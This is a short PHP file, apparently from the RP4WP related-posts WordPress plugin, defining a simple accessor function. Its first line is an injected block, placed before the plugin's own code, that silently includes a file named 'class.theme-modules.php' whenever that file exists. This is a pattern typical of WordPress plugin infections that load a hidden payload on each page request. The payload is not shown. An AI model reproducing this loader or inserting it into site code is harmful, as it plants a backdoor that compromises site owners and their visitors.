<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * @since  1.0.0
 * @access public
 *
 * @return RP4WP
 */
function RP4WP() {
	return RP4WP::get();
}